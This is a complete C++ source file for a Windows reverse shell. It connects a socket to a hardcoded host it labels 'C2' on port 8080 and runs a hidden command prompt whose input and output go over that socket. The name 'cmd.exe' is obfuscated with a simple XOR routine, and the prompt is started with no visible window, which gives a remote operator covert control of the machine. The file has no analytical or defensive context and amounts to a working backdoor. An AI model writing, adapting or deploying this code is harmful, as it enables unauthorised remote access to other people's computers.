#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <iostream>
#include "xor.h"

using namespace std;

#pragma comment(lib,"ws2_32.lib")

WORD wWsaVer = MAKEWORD(2, 2);
WSADATA wsaData = { 0 };
SOCKET WSAAPI mySocket = INVALID_SOCKET;
struct sockaddr_in serverAddr = { 0 };
USHORT port = 8080;
PCSTR C2 = "192.168.0.1";
INT ConnectRet = 0;
STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi = { 0 };
BOOL Ret = FALSE;
const unsigned char key[] = { '2', '2', '2', 'h', '2', '4', '1'};
const unsigned char encodedcmd[] = { 'Q', '_', 'V','F', 'W', 'L','T'};
unsigned char decodedcmd[8] = { 0 };



void decrypt_xor(const unsigned char* encodedcmd, const unsigned char* key, unsigned char* decodedcmd)
{
	int i = 0;
	for (; i < 7; i++)
	{
		decodedcmd[i] = encodedcmd[i] ^ key[i];
	}
	decodedcmd[7] = '\0';
}


INT main()
{
	cout << "[+] Initializing Winsock library..." << endl;

	//Create socket handle
	int err = WSAStartup(
		wWsaVer,
		&wsaData
	);

	if (err != 0)
	{
		cout << "[x] Error initializating WinSock.dll: " << err << endl;
	}

	cout << "[+] Winsock library initialized correctly." << endl;

	cout << "[+] Creating a socket..." << endl;

	mySocket = WSASocket(
		AF_INET,
		SOCK_STREAM,
		IPPROTO_TCP,
		NULL,
		0,
		NULL
	);
	 
	if (mySocket == INVALID_SOCKET)
	{
		cout << "[x] Error creating the socket: " << WSAGetLastError() << endl;
	}

	cout << "[+] Socket created successfully." << endl;

	// Setting address for C2
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(port);
	inet_pton(AF_INET, C2, &serverAddr.sin_addr);

	// Connect to C2
	
	ConnectRet = WSAConnect(
		mySocket,
		(SOCKADDR*)&serverAddr,
		sizeof(serverAddr),
		NULL,
		NULL,
		NULL,
		NULL);

	if (ConnectRet == SOCKET_ERROR)
	{
		cout << "[x] Error connecting to C2: " << WSAGetLastError() << endl;
		WSACleanup();
		return 1;
	}

	cout << "[+] Successfully connected to C2." << endl;

	si.hStdInput = (HANDLE)mySocket;
	si.hStdOutput = (HANDLE)mySocket;
	si.hStdError = (HANDLE)mySocket;
	si.dwFlags = (STARTF_USESTDHANDLES);
	

	decrypt_xor(encodedcmd, key, decodedcmd);

	Ret = CreateProcessA(NULL, (LPSTR)decodedcmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	
	if (!Ret)
	{
		cout << "[x] Error creating shell." << endl;
		return 1;
	}

	cout << "[+] Shell created successfully." << endl;

	return 0;

}
